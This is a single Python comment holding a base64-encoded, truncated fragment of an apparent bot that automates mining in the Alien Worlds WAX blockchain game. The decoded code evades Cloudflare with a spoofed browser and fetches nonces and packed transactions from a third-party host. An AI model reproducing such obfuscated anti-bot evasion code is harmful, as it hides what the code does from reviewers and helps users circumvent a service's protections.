#   god     = 'ICAgICAgICAgICAgICAgJ2RlbGF5JyAgICAgICAgIDoganNvbi5sb2FkcyhzZWxmLkRBVEFbJ1BST0NFU1MnXVsnZ2V0X2JhZ3MnXS5jb250ZW50KVsnZGF0YSddWydkYXRhJ11bImRlbGF5Il0NCiAgICAgICAgICAgICAgICAgICAgfSkNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgICAgIHByaW50KCBmJ0VSUk9SIGdldF9iYWdzKCkgMjcxIDoge2V9JyApDQogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICANCiAgICBkZWYgZ2V0X2xhbmQoDQogICAgICAgIHNlbGYNCiAgICApOg0KICAgICAgICANCiAgICAgICAgc2VsZi5EQVRBWydQUk9DRVNTJ11bJ2dldF9sYW5kJ10gPSBOb25lDQogICAgICAgIA0KICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGlmICgNCiAgICAgICAgICAgICAgICAgICAgVEhSRUFERVJbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydzdGF0dXMnXSA9PSBGYWxzZSBvciBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXR1cyddID09IE5vbmUNCiAgICAgICAgICAgICAgICApIG9yICgNCiAgICAgICAgICAgICAgICAgICAgREFUQUJBU0VbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydzdGF0J10gPT0gRmFsc2UNCiAgICAgICAgICAgICAgICApOg0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgc2VsZi5EQVRBWydQUk9DRVNTJ11bJ2dldF9sYW5kJ10gICAgICAgICAgICA9IGNsb3Vkc2NyYXBlci5jcmVhdGVfc2NyYXBlcigpLmdldCgNCiAgICAgICAgICAgICAgICAgICAgZidodHRwOi8vd2F4LmFwaS5hdG9taWNhc3NldHMuaW8vYXRvbWljYXNzZXRzL3YxL2Fzc2V0cy97IHNlbGYuREFUQVsibGFzdF9taW5lIl1bImN1cnJlbnRfbGFuZCJdIH0nDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgIHNlbGYuREFUQS51cGRhdGUoew0KICAgICAgICAgICAgICAgICAgICAnbGFuZCcgICAgICAgICAgOiB7DQogICAgICAgICAgICAgICAgICAgICAgICAnZGlmZmljdWx0eScgICAgOiBqc29uLmxvYWRzKHNlbGYuREFUQVsnUFJPQ0VTUyddWydnZXRfbGFuZCddLmNvbnRlbnQpWydkYXRhJ11bJ2RhdGEnXVsnZGlmZmljdWx0eSddLCANCiAgICAgICAgICAgICAgICAgICAgICAgICdjb21taXNzaW9uJyAgICA6IGZsb2F0KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICd7MH0uezF9Jy5mb3JtYXQoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cihqc29uLmxvYWRzKHNlbGYuREFUQVsiUFJPQ0VTUyJdWyJnZXRfbGFuZCJdLmNvbnRlbnQpWyJkYXRhIl1bImRhdGEiXVsiY29tbWlzc2lvbiJdKVswXSwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cihqc29uLmxvYWRzKHNlbGYuREFUQVsiUFJPQ0VTUyJdWyJnZXRfbGFuZCJdLmNvbnRlbnQpWyJkYXRhIl1bImRhdGEiXVsiY29tbWlzc2lvbiJdKVstMjpdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgKSBpZiBqc29uLmxvYWRzKHNlbGYuREFUQVsiUFJPQ0VTUyJdWyJnZXRfbGFuZCJdLmNvbnRlbnQpWyJkYXRhIl1bImRhdGEiXVsiY29tbWlzc2lvbiJdID49IDEgZWxzZSAwLjAwLCANCiAgICAgICAgICAgICAgICAgICAgICAgICdkZWxheScgICAgICAgICA6IGZsb2F0KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICd7MH0uezF9Jy5mb3JtYXQoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cihqc29uLmxvYWRzKHNlbGYuREFUQVsiUFJPQ0VTUyJdWyJnZXRfbGFuZCJdLmNvbnRlbnQpWyJkYXRhIl1bImRhdGEiXVsiZGVsYXkiXSlbMF0sIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHIoanNvbi5sb2FkcyhzZWxmLkRBVEFbIlBST0NFU1MiXVsiZ2V0X2xhbmQiXS5jb250ZW50KVsiZGF0YSJdWyJkYXRhIl1bImRlbGF5Il0pWy0xOl0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgICAgICAgICApIGlmIGpzb24ubG9hZHMoc2VsZi5EQVRBWyJQUk9DRVNTIl1bImdldF9sYW5kIl0uY29udGVudClbImRhdGEiXVsiZGF0YSJdWyJkZWxheSJdID49IDEgZWxzZSAxLjANCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgcHJpbnQoIGYnRVJST1IgZ2V0X2xhbmQoKSAyNzEgOiB7ZX0nICkNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDUpDQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGJyZWFrDQogICAgZGVmIHNldF9kaWZmaWN1bHR5KA0KICAgICAgICBzZWxmDQogICAgKToNCiAgICAgICAgc2VsZi5EQVRBLnVwZGF0ZSh7DQogICAgICAgICAgICAnZGlmZmljdWx0eScgOiBzZWxmLkRBVEFbJ2xhbmQnXVsnZGlmZmljdWx0eSddDQogICAgICAgIH0pDQogICAgICAgIHsNCiAgICAgICAgICAgIHNlbGYuREFUQS51cGRhdGUoew0KICAgICAgICAgICAgICAgICdkaWZmaWN1bHR5JyA6IHNlbGYuREFUQVsnZGlmZmljdWx0eSddICsgc2VsZi5EQVRBWydiYWdzJ11bdF1bJ2RpZmZpY3VsdHknXQ0KICAgICAgICAgICAgfSkgZm9yIHQgaW4gbGlzdChzZWxmLkRBVEFbJ2JhZ3MnXSkgaWYgc2VsZi5EQVRBWydiYWdzJ11bdF1bJ2RpZmZpY3VsdHknXSA+PSAxDQogICAgICAgIH0NCiAgICBkZWYgc2V0X2Nvb2xkb3duKA0KICAgICAgICBzZWxmDQogICAgKToNCiAgICAgICAgc2VsZi5EQVRBLnVwZGF0ZSh7DQogICAgICAgICAgICAnY29vbGRvd24nIDogMA0KICAgICAgICB9KQ0KICAgICAgICB7DQogICAgICAgICAgICBzZWxmLkRBVEEudXBkYXRlKHsNCiAgICAgICAgICAgICAgICAnY29vbGRvd24nIDogc2VsZi5EQVRBWydjb29sZG93biddICsgc2VsZi5EQVRBWydiYWdzJ11bdF1bJ2RlbGF5J10NCiAgICAgICAgICAgIH0pIGZvciB0IGluIGxpc3Qoc2VsZi5EQVRBWydiYWdzJ10pIGlmIHNlbGYuREFUQVsnYmFncyddW3RdWydkZWxheSddID49IDENCiAgICAgICAgfQ0KICAgICAgICBzZWxmLkRBVEEudXBkYXRlKHsNCiAgICAgICAgICAgICdjb29sZG93bicgOiBzZWxmLkRBVEFbJ2Nvb2xkb3duJ10gKiBzZWxmLkRBVEFbJ2xhbmQnXVsnZGVsYXknXQ0KICAgICAgICB9KQ0KICAgICAgICByZXR1cm4gc2VsZi5EQVRBWydjb29sZG93biddDQogICAgZGVmIGNoa19jcHUoDQogICAgICAgIHNlbGYNCiAgICApOg0KICAgICAgICBzZWxmLkRBVEEudXBkYXRlKHsNCiAgICAgICAgICAgICdjcHUnICAgICAgIDogc2VsZi5EQVRBWydhY2NvdW50J11bJ2NwdV9saW1pdCddDQogICAgICAgIH0pDQogICAgICAgIHNlbGYuREFUQVsnY3B1J10udXBkYXRlKHsNCiAgICAgICAgICAgICdhbGxvdycgICAgIDogZmxvYXQoZid7ZmxvYXQoc2VsZi5EQVRBWyJjcHUiXVsiYXZhaWxhYmxlIl0gKiAxMDAgLyBzZWxmLkRBVEFbImNwdSJdWyJtYXgiXSk6LjJmfScpDQogICAgICAgIH0pDQogICAgICAgIHJldHVybiBzZWxmLkRBVEFbJ2NwdSddWydhbGxvdyddDQogICAgZGVmIGdldF9ub25jZSgNCiAgICAgICAgc2VsZg0KICAgICk6DQogICAgICAgIA0KICAgICAgICBnbG9iYWwgREFUQUJBU0UNCiAgICAgICAgDQogICAgICAgIHNlbGYuREFUQVsnUFJPQ0VTUyddWydnZXRfbm9uY2UnXSA9IE5vbmUNCiAgICAgICAgDQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaWYgKA0KICAgICAgICAgICAgICAgICAgICBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXR1cyddID09IEZhbHNlIG9yIFRIUkVBREVSWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdHVzJ10gPT0gTm9uZQ0KICAgICAgICAgICAgICAgICkgb3IgKA0KICAgICAgICAgICAgICAgICAgICBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXQnXSA9PSBGYWxzZQ0KICAgICAgICAgICAgICAgICk6DQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBzZWxmLkRBVEFbJ1BST0NFU1MnXVsnZ2V0X25vbmNlJ10gICAgICAgICAgID0gY2xvdWRzY3JhcGVyLmNyZWF0ZV9zY3JhcGVyKCkuZ2V0KA0KICAgICAgICAgICAgICAgICAgICBmJ3sgcmFuZG9tLmNob2ljZSggV0FYQVBJKCkuaG9zdG1pbmVyIClbImFkZHJlc3MiXSB9eyBzZWxmLkRBVEFbImxvZ2luIl1bInVzZXJBY2NvdW50Il0gfSZkaWZmaWN1bHR5PXsgc2VsZi5EQVRBWyJkaWZmaWN1bHR5Il0gfSZsYXN0TWluZVR4PXsgc2VsZi5EQVRBWyJsYXN0X21pbmUiXVsibGFzdF9taW5lX3R4Il0gfScNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgc2VsZi5EQVRBLnVwZGF0ZSh7DQogICAgICAgICAgICAgICAgICAgICdub25jZScgICAgICAgICA6IGpzb24ubG9hZHMoc2VsZi5EQVRBWydQUk9DRVNTJ11bJ2dldF9ub25jZSddLmNvbnRlbnQpDQogICAgICAgICAgICAgICAgfSkNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsndGV4dCddWycxMCddICAgICAgPSBmJzxwcmU+Mi83IEdFVCB7IHNlbGYuREFUQVsibm9uY2UiXVsibm9uY2UiXSB9PC9wcmU+JyANCiAgICAgICAgICAgICAgICBleGNlcHQgICAgICA6IHBhc3MNCiAgICAgICAgICAgICAgICB0cnkgICAgICAgICA6IERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsndGV4dCddWydzdGVwJ10gICAgPSAnMTAnDQogICAgICAgICAgICAgICAgZXhjZXB0ICAgICAgOiBwYXNzDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgbm90IHJlLnNlYXJjaCgnKFwnfFwifF58JClcd3sxNCwxNn0oXCd8XCJ8XnwkKScsIHN0cihzZWxmLkRBVEFbJ25vbmNlJ10pKToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIGYnRVJST1IgZ2V0X25vbmNlKCkgMjcxIDogTk9UIEZPVU5EIG5vbmNlJyApDQogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICBwcmludCggZidFUlJPUiBnZXRfbm9uY2UoKSAyNzEgOiB7ZX0nICkNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDUpDQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGJyZWFrDQogICAgZGVmIHNldF9pbmZvX2Jsb2NrKA0KICAgICAgICBzZWxmDQogICAgKToNCiAgICAgICAgDQogICAgICAgIHNlbGYuREFUQVsnUFJPQ0VTUyddWydnZXRfaW5mb19ibG9jayddID0gTm9uZQ0KICAgICAgICANCiAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBpZiAoDQogICAgICAgICAgICAgICAgICAgIFRIUkVBREVSWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdHVzJ10gPT0gRmFsc2Ugb3IgVEhSRUFERVJbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydzdGF0dXMnXSA9PSBOb25lDQogICAgICAgICAgICAgICAgKSBvciAoDQogICAgICAgICAgICAgICAgICAgIERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdCddID09IEZhbHNlDQogICAgICAgICAgICAgICAgKToNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHNlbGYuREFUQVsnUFJPQ0VTUyddWydnZXRfaW5mb19ibG9jayddICAgICAgPSBjbG91ZHNjcmFwZXIuY3JlYXRlX3NjcmFwZXIoDQogICAgICAgICAgICAgICAgICAgIGJyb3dzZXIgPSB7DQogICAgICAgICAgICAgICAgICAgICAgICAnY3VzdG9tJzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjYwLjkpIEdlY2tvLzIwMTAwMTAxIEdvYW5uYS80LjEgRmlyZWZveC82MC45IFBhbGVNb29uLzI4LjIuMicNCiAgICAgICAgICAgICAgICAgICAgfSwgDQogICAgICAgICAgICAgICAgICAgICMgICBkZWJ1ZyA9IFRydWUsIA0KICAgICAgICAgICAgICAgICAgICBkZWxheSAgID0gMTANCiAgICAgICAgICAgICAgICApLnBvc3QoDQogICAgICAgICAgICAgICAgICAgICdodHRwczovL2NoYWluLndheC5pby92MS9jaGFpbi9nZXRfaW5mbycsIA0KICAgICAgICAgICAgICAgICAgICBkYXRhICAgID0gZid7e319JywgDQogICAgICAgICAgICAgICAgICAgICMgICBwcm94aWVzICAgICA9IHsNCiAgICAgICAgICAgICAgICAgICAgIyAgICAgICAiaHR0cCIgICAgICA6ICJzb2NrczU6Ly8xMjcuMC4wLjE6MjMzMjEiLCANCiAgICAgICAgICAgICAgICAgICAgIyAgICAgICAiaHR0cHMiICAgICA6ICJzb2NrczU6Ly8xMjcuMC4wLjE6MjMzMjEiLCANCiAgICAgICAgICAgICAgICAgICAgIyAgICAgICAiZnRwIiAgICAgICA6ICJzb2NrczU6Ly8xMjcuMC4wLjE6MjMzMjEiDQogICAgICAgICAgICAgICAgICAgICMgICB9DQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgIHNlbGYuREFUQVsnYmxvY2snXS51cGRhdGUoew0KICAgICAgICAgICAgICAgICAgICAnY2hhaW5faWQnICAgICAgICAgIDoganNvbi5sb2FkcyhzZWxmLkRBVEFbJ1BST0NFU1MnXVsnZ2V0X2luZm9fYmxvY2snXS5jb250ZW50KVsnY2hhaW5faWQnXSwgDQogICAgICAgICAgICAgICAgICAgICdoZWFkX2Jsb2NrX251bScgICAgOiBqc29uLmxvYWRzKHNlbGYuREFUQVsnUFJPQ0VTUyddWydnZXRfaW5mb19ibG9jayddLmNvbnRlbnQpWydoZWFkX2Jsb2NrX251bSddIC0gMw0KICAgICAgICAgICAgICAgIH0pDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgcHJpbnQoIGYnRVJST1IgZ2V0X2luZm9fYmxvY2soKSAyNzEgOiB7ZX0nICkNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDUpDQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaWYgKA0KICAgICAgICAgICAgICAgICAgICBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXR1cyddID09IEZhbHNlIG9yIFRIUkVBREVSWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdHVzJ10gPT0gTm9uZQ0KICAgICAgICAgICAgICAgICkgb3IgKA0KICAgICAgICAgICAgICAgICAgICBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXQnXSA9PSBGYWxzZQ0KICAgICAgICAgICAgICAgICk6DQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBzZWxmLkRBVEFbJ1BST0NFU1MnXVsnZ2V0X2luZm9fYmxvY2snXSAgICAgID0gY2xvdWRzY3JhcGVyLmNyZWF0ZV9zY3JhcGVyKA0KICAgICAgICAgICAgICAgICAgICBicm93c2VyID0gew0KICAgICAgICAgICAgICAgICAgICAgICAgJ2N1c3RvbSc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjo2MC45KSBHZWNrby8yMDEwMDEwMSBHb2FubmEvNC4xIEZpcmVmb3gvNjAuOSBQYWxlTW9vbi8yOC4yLjInDQogICAgICAgICAgICAgICAgICAgIH0sIA0KICAgICAgICAgICAgICAgICAgICAjICAgZGVidWcgPSBUcnVlLCANCiAgICAgICAgICAgICAgICAgICAgZGVsYXkgICA9IDEwDQogICAgICAgICAgICAgICAgKS5wb3N0KA0KICAgICAgICAgICAgICAgICAgICAnaHR0cHM6Ly9jaGFpbi53YXguaW8vdjEvY2hhaW4vZ2V0X2Jsb2NrJywgDQogICAgICAgICAgICAgICAgICAgIGRhdGEgICAgPSBmJ3t7XCJibG9ja19udW1fb3JfaWRcIjp7IHNlbGYuREFUQVsiYmxvY2siXVsiaGVhZF9ibG9ja19udW0iXSB9fX0nLCANCiAgICAgICAgICAgICAgICAgICAgIyAgIHByb3hpZXMgICAgID0gew0KICAgICAgICAgICAgICAgICAgICAjICAgICAgICJodHRwIiAgICAgIDogInNvY2tzNTovLzEyNy4wLjAuMToyMzMyMSIsIA0KICAgICAgICAgICAgICAgICAgICAjICAgICAgICJodHRwcyIgICAgIDogInNvY2tzNTovLzEyNy4wLjAuMToyMzMyMSIsIA0KICAgICAgICAgICAgICAgICAgICAjICAgICAgICJmdHAiICAgICAgIDogInNvY2tzNTovLzEyNy4wLjAuMToyMzMyMSINCiAgICAgICAgICAgICAgICAgICAgIyAgIH0NCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgc2VsZi5EQVRBWydibG9jayddLnVwZGF0ZSh7DQogICAgICAgICAgICAgICAgICAgICdyZWZfYmxvY2tfcHJlZml4JyAgOiBqc29uLmxvYWRzKHNlbGYuREFUQVsnUFJPQ0VTUyddWydnZXRfaW5mb19ibG9jayddLmNvbnRlbnQpWydyZWZfYmxvY2tfcHJlZml4J10sIA0KICAgICAgICAgICAgICAgICAgICAnZXhwaXJhdGlvbicgICAgICAgIDogWw0KICAgICAgICAgICAgICAgICAgICAgICAganNvbi5sb2FkcyhzZWxmLkRBVEFbJ1BST0NFU1MnXVsnZ2V0X2luZm9fYmxvY2snXS5jb250ZW50KVsndGltZXN0YW1wJ10sIA0KICAgICAgICAgICAgICAgICAgICAgICAgKA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVkYXRlLnN0cnB0aW1lKCBqc29uLmxvYWRzKHNlbGYuREFUQVsnUFJPQ0VTUyddWydnZXRfaW5mb19ibG9jayddLmNvbnRlbnQpWyd0aW1lc3RhbXAnXSwgIiVZLSVtLSVkVCVIOiVNOiVTLiVmIiApICsgZGF0ZXRpbWUudGltZWRlbHRhKDAsMzApDQogICAgICAgICAgICAgICAgICAgICAgICApLnN0cmZ0aW1lKGYiJVktJW0tJWRUJUg6JU06JVMuJWYiKVs6LTNdDQogICAgICAgICAgICAgICAgICAgIF0NCiAgICAgICAgICAgICAgICB9KQ0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgIHByaW50KCBmJ0VSUk9SIGdldF9pbmZvX2Jsb2NrKCkgMjcxIDoge2V9JyApDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCg1KQ0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICBicmVhaw0KICAgIGRlZiBzZXRfcGFja2VkdHJ4KA0KICAgICAgICBzZWxmDQogICAgKToNCiAgICAgICAgDQogICAgICAgIHNlbGYuREFUQVsnUFJPQ0VTUyddWydzZXRfcGFja2VkdHJ4J10gPSBOb25lDQogICAgICAgICAgICAgICAgDQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaWYgKA0KICAgICAgICAgICAgICAgICAgICBUSFJFQURFUlsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXR1cyddID09IEZhbHNlIG9yIFRIUkVBREVSWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdHVzJ10gPT0gTm9uZQ0KICAgICAgICAgICAgICAgICkgb3IgKA0KICAgICAgICAgICAgICAgICAgICBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3N0YXQnXSA9PSBGYWxzZQ0KICAgICAgICAgICAgICAgICk6DQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBzZWxmLkRBVEFbJ1BST0NFU1MnXVsnc2V0X3BhY2tlZHRyeCddID0gY2xvdWRzY3JhcGVyLmNyZWF0ZV9zY3JhcGVyKCkuZ2V0KA0KICAgICAgICAgICAgICAgICAgICBmJ2h0dHA6Ly9hd21pbmUtZXhwcmVzcy52ZXJjZWwuYXBwL3BhY2tlZHRyeD9hY3Rvcj17IHNlbGYuREFUQVsibG9naW4iXVsidXNlckFjY291bnQiXSB9JmJsb2NrX251bV9vcl9pZD17IHNlbGYuREFUQVsiYmxvY2siXVsiaGVhZF9ibG9ja19udW0iXSB9LXsgc2VsZi5EQVRBWyJibG9jayJdWyJyZWZfYmxvY2tfcHJlZml4Il0gfSZub25jZT17IHNlbGYuREFUQVsibm9uY2UiXVsibm9uY2UiXSB9JmV4cGlyYXRpb249eyBzZWxmLkRBVEFbImJsb2NrIl1bImV4cGlyYXRpb24iXVsxXSB9JmNoYWluSWQ9eyBzZWxmLkRBVEFbImJsb2NrIl1bImNoYWluX2lkIl0gfScNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgc2VsZi5EQVRBWydwYWNrZWR0cngnXS51cGRhdGUoanNvbi5sb2FkcyhzZWxmLkRBVEFbJ1BST0NFU1MnXVsnc2V0X3BhY2tlZHRyeCddLmNvbnRlbnQpKQ0KICAgICAgICAgICAgICAgIHNlbGYuREFUQVsncGFja2VkdHJ4J11bJ3NlcmlhbGl6ZWRUcmFuc2FjdGlvbiddLnVwZGF0ZSh7DQogICAgICAgICAgICAgICAgICAgICdVbml0OEFycmF5JyA6IFsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuREFUQVsncGFja2VkdHJ4J11bJ3NlcmlhbGl6ZWRUcmFuc2FjdGlvbiddW3hdIGZvciB4IGluIHNlbGYuREFUQVsncGFja2VkdHJ4J11bJ3NlcmlhbGl6ZWRUcmFuc2FjdGlvbiddDQogICAgICAgICAgICAgICAgICAgIF0NCiAgICAgICAgICAgICAgICB9KQ0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgICAgIHByaW50KCBmJ0VSUk9SIHNldF9wYWNrZWR0cngoKSAyNzEgOiB7ZX0nICkNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDUpDQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGJyZWFrDQogICAgZGVmIGNsYWltX3NpZ24oDQogICAgICAgIHNlbGYNCiAgICApOg0KICAgICAgICANCiAgICAgICAgZ2xvYmFsIERBVEFCQVNFDQogICAgICAgIA0KICAgICAgICBzZWxmLkRBVEFbJ1BST0NFU1MnXVsnY2xhaW1fc2lnbiddID0gTm9uZQ0KICAgICAgICANCiAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBpZiAoDQogICAgICAgICAgICAgICAgICAgIFRIUkVBREVSWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdHVzJ10gPT0gRmFsc2Ugb3IgVEhSRUFERVJbIHNlbGYuREFUQVsnd2F4aWQnXSBdWydzdGF0dXMnXSA9PSBOb25lDQogICAgICAgICAgICAgICAgKSBvciAoDQogICAgICAgICAgICAgICAgICAgIERBVEFCQVNFWyBzZWxmLkRBVEFbJ3dheGlkJ10gXVsnc3RhdCddID09IEZhbHNlDQogICAgICAgICAgICAgICAgKToNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgdHJ5Og0KDQogICAgICAgICAgICAgICAgdHJ5ICAgICAgICAgOiBEQVRBQkFTRVsgc2VsZi5EQVRBWyd3YXhpZCddIF1bJ3RleHQnXVsnc3RlcCddID0gJzEyJw0KICAgICAgICAgICAgICAgIGV4Y2VwdCAgICAgIDogcGFzcw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHNlbGYuREFUQVsndHJhbnNhY3Rpb24nXS51cGRhdGUoew0KICAgICAgICAgICAgICAgICAgICAncmF3JyA6IGYne3tcInRyYW5zYWN0aW9uXCI6e3tcImV4cGlyYXRpb25cIjpcInsgc2VsZi5EQVRBWyJibG9jayJdWyJleHBpcmF0aW9uIl1bMV0gfVwiLFwicmVmX2Jsb2NrX251bVwiOnsgc2VsZi5EQVRBWyJwYWNrZWR0cngiXVsidHJhbnNhY3Rpb25zIl1bInJlZl9ibG9ja19udW0iXSB9LFwicmVmX2Jsb2NrX3ByZWZpeFwiOnsgc2VsZi5EQVRBWyJwYWNrZWR0cngiXVsidHJhbnNhY3Rpb25zIl1bInJlZl9ibG9ja19wcmVmaXgiXSB9LFwiYWN0aW9uc1wiOlt7e1wiYWNjb3VudFwiOlwibS5mZWRlcmF0aW9uXCIsXCJuYW1lXCI6XCJtaW5lXCIsXCJhdXRob3JpemF0aW9uXCI6W3t7XCJhY3RvclwiOlwieyBzZWxmLkRBVEFbImxvZ2luIl1bInVzZXJBY2NvdW50Il0gfVwiLFwicGVybWlzc2lvblwiOlwiYWN0aXZlXCJ9fV0sXCJkYXRhIjpcInsgc2VsZi5EQVRBWyJwYWNrZWR0cngiXVsidHJhbnNhY3Rpb25zIl1bImFjdGlvbnMiXVswXVsiZGF0YSJdIH1cIn19XX19LFwiYXZhaWxhYmxlX2tleXNcIjpbXCJ7IHNlbGYuREFUQVsiYWNjb3VudCJdWyJwZXJtaXNzaW9ucyJdWzBdWyJyZXF1aXJlZF9hdXRoIl1bImtleXMiXVswXVsia2V5Il0gfVwiLFwieyBzZWxmLkRBVEFbImFjY291bnQiXVsicGVybWlzc2lvbnMiXVswXVsicmVxdWlyZWRfYXV0aCJdWyJrZXlzIl1bMV1bImtleSJdIH1cIl19fScNCiAgICAgICAgICAgICAgICB9KQ0KICAgICAgICAgICAgICAgIHNlbGYuREFUQVsnUFJPQ0VTUyddWydjbGFpbV9zaWduJ10gICAgICAgPSBjbG91ZHNjcmFwZXIuQ2xvdWRTY3JhcGVyKA0KICAgICAgICAgICAgICAgICAgICBicm93c2VyID0gew0KICAgICAgICAgICAgICAgICAgICAgICAgJ2N1c3RvbSc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjo2MC45KSBHZWNrby8yMDEwMDEwMSBHb2FubmEvNC4xIEZpcmVmb3gvNjAuOSBQYWxlTW9vbi8yOC4yLjInDQogICAgICAgICAgICAgICAgICAgIH0sIA0KICAgICAgICAgICAgICAgICAgICBkZWJ1ZyAgID0gVHJ1ZSwgDQogICAgICAgICAgICAgICAgICAgIGRlbGF5ICAgPSAxMA0KICAgICAgICAgICAgICAgICkucG9zdCgNCiAgICAgICAgICAgICAgICAgICAgJ2h0dHBzOi8vY2hhaW4ud2F4LmlvL3YxL2NoYWluL2dldF9yZXF1aXJlZF9rZXlzJywgDQogICAgICAgICAgICAgICAgICAgIGRhdGEgICAgPSBzZWxmLkRBVEFb